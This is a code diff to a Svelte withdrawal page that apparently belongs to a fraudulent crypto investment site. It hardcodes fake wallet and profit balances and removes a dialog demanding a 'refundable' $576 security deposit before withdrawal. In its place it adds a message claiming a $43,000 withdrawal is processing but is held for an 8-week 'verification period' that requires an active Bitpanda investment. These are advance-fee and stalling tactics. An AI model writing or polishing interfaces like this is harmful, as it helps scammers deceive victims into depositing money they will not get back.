@@ -5,8 +5,8 @@
     import Icon from '@iconify/svelte';
 
     const walletBalance = "201,821.00";
-    const profitBalance = "150,000.00";
-    const profitBalanceNum = 150000.00;
+    const profitBalance = "160,000.00";
+    const profitBalanceNum = 160000.00;
 
     // Recent withdrawal history
     import { transactionsStore } from '$lib/stores/transactions.svelte';
@@ -25,6 +25,14 @@
     let withdrawAmount = '';
     let amountError = '';
     let inputTouched = false;
+
+    $: formattedWithdrawAmount = (() => {
+        const val = withdrawAmount ? parseAmount(withdrawAmount) : NaN;
+        if (!isNaN(val) && val > 0) {
+            return '$' + val.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 2 });
+        }
+        return '$43,000';
+    })();
 
     function parseAmount(val: string): number {
         // Strip commas and whitespace
@@ -235,9 +243,9 @@
                             <p class="font-medium text-white">
                                 -${withdrawal.amount}
                             </p>
-                            <p class="text-xs text-yellow-400 flex items-center gap-1 justify-end">
-                                <span class="w-1.5 h-1.5 bg-yellow-400 rounded-full animate-pulse"></span>
-                                {withdrawal.status}
+                            <p class="text-xs {withdrawal.status === 'Completed' ? 'text-green-400' : 'text-yellow-400'} flex items-center gap-1 justify-end">
+                                <span class="w-1.5 h-1.5 {withdrawal.status === 'Completed' ? 'bg-green-400' : 'bg-yellow-400'} rounded-full animate-pulse"></span>
+                                {withdrawal.status === 'Completed' ? 'Processed' : 'Processing'}
                             </p>
                         </div>
                     </div>
@@ -267,7 +275,7 @@
 </div>
 {/if}
 
-<!-- Security Deposit Dialog Overlay -->
+<!-- Verification Period Dialog Overlay -->
 {#if showSecurityDialog}
 <!-- svelte-ignore a11y_click_events_have_key_events -->
 <!-- svelte-ignore a11y_no_static_element_interactions -->
@@ -296,60 +304,37 @@
             <Icon icon="mdi:close" class="text-xl" />
         </button>
 
-        <!-- Shield Icon with Glow -->
+        <!-- Icon with Glow -->
         <div class="relative mx-auto w-20 h-20 mb-6 flex items-center justify-center">
-            <div class="absolute inset-0 bg-yellow-500/20 blur-2xl rounded-full animate-pulse"></div>
-            <div class="relative w-16 h-16 bg-yellow-500/10 rounded-full flex items-center justify-center border border-yellow-500/30">
-                <Icon icon="mdi:shield-lock-outline" class="text-4xl text-yellow-500" />
+            <div class="absolute inset-0 bg-secondary/20 blur-2xl rounded-full animate-pulse"></div>
+            <div class="relative w-16 h-16 bg-secondary/10 rounded-full flex items-center justify-center border border-secondary/30">
+                <Icon icon="mdi:clock-outline" class="text-4xl text-secondary" />
             </div>
         </div>
 
-        <h2 class="text-xl font-bold text-white text-center mb-2">Security Deposit Required</h2>
-        <p class="text-white/60 text-sm text-center mb-6 leading-relaxed">
-            To secure your withdrawal and comply with our anti-fraud verification protocols, a refundable security deposit is required before processing.
-        </p>
+        <h2 class="text-2xl font-bold text-white text-center mb-4">
+            Congratulations 🎉
+        </h2>
 
-        <!-- Deposit Amount -->
-        <div class="bg-white/5 rounded-2xl p-5 border border-white/10 mb-6">
-            <div class="flex items-center justify-between mb-2">
-                <span class="text-white/50 text-sm">Required Deposit</span>
-                <span class="text-xs bg-yellow-500/10 text-yellow-400 px-2 py-0.5 rounded-full border border-yellow-500/20">Refundable</span>
-            </div>
-            <p class="text-3xl font-bold text-white">$576.00 <span class="text-base text-white/40 font-normal">USD</span></p>
+        <div class="space-y-4 text-white/70 text-sm leading-relaxed mb-6 text-left bg-white/5 p-5 rounded-2xl border border-white/10">
+            <p class="text-white font-bold text-base leading-snug">
+                Your $43,000 withdrawal is currently being processed.
+            </p>
+            <p>
+                As this is your first withdrawal, your account requires a verification period. During this time, you are expected to maintain an active investment on Bitpanda for at least 8 weeks to complete the verification process.
+            </p>
+            <p>
+                Once verification is complete, your withdrawal will be released to your designated wallet. Thank you for your patience and understanding.
+            </p>
         </div>
 
-        <!-- Info Points -->
-        <div class="space-y-3 mb-6">
-            <div class="flex items-start gap-3">
-                <Icon icon="mdi:check-circle" class="text-secondary mt-0.5 shrink-0" />
-                <p class="text-white/60 text-xs">Deposit is fully refundable after withdrawal is processed</p>
-            </div>
-            <div class="flex items-start gap-3">
-                <Icon icon="mdi:check-circle" class="text-secondary mt-0.5 shrink-0" />
-                <p class="text-white/60 text-xs">Standard anti-fraud compliance measure for large withdrawals</p>
-            </div>
-            <div class="flex items-start gap-3">
-                <Icon icon="mdi:check-circle" class="text-secondary mt-0.5 shrink-0" />
-                <p class="text-white/60 text-xs">Your funds are protected by 256-bit encryption</p>
-            </div>
-        </div>
-
-        <!-- Actions -->
-        <div class="space-y-3">
-            <a 
-                href="/deposit" 
-                class="btn-primary w-full py-3.5 text-sm font-bold"
-                id="security-deposit-btn"
-            >
-                Proceed to Deposit
-            </a>
-            <button 
-                class="btn-ghost w-full py-3 text-sm text-white/50 hover:text-white/80"
-                on:click={closeDialog}
-            >
-                Cancel
-            </button>
-        </div>
+        <!-- Action Button -->
+        <button 
+            class="btn-primary w-full py-3.5 text-sm font-bold"
+            on:click={closeDialog}
+        >
+            Understood
+        </button>
     </div>
 </div>
 {/if}
